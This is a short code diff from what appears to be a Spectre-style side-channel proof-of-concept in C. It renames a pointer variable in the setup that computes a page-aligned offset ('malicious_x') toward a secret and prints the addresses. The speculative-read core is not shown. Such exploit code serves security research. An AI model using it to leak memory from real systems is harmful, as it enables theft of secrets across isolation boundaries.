@@ -143,6 +143,7 @@ int main(int argc, const char * * argv) {
   size_t distanceFromCurrentAddressToDesiredAddress; /* default for malicious_x */
   int i, score[3], len = 23;
   uint8_t value[3];
+  char* address;
   for (i = 0; i < sizeof(array2); i++)
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   for (i = 0; i < sizeof(bigArray); i++)
@@ -152,8 +153,8 @@ int main(int argc, const char * * argv) {
 
   //Find the address that corresponds to secret[0] in terms of its modulu
   for (i = 0; i < sizeof(bigArray); i++) {
-      addr = &bigArray[i];
-      distanceFromCurrentAddressToDesiredAddress = (size_t)(secret - (char *)addr);
+      address = &bigArray[i];
+      distanceFromCurrentAddressToDesiredAddress = (size_t)(secret - (char *)address);
       distanceFromCurrentAddressToDesiredAddress = abs(distanceFromCurrentAddressToDesiredAddress);
 
       if (distanceFromCurrentAddressToDesiredAddress % 4096 == 0) {
@@ -164,7 +165,7 @@ int main(int argc, const char * * argv) {
   bigArray[distanceFromCurrentAddressToDesiredAddress] = 'N';
 
   printf("Malicious x is %zu\n", distanceFromCurrentAddressToDesiredAddress);
-  printf("Address of bigArray is %p\n", addr);
+  printf("Address of bigArray is %p\n", address);
   printf("Address of the secret is %p\n", secret);
   while (--len >= 0) {
     printf("\n");
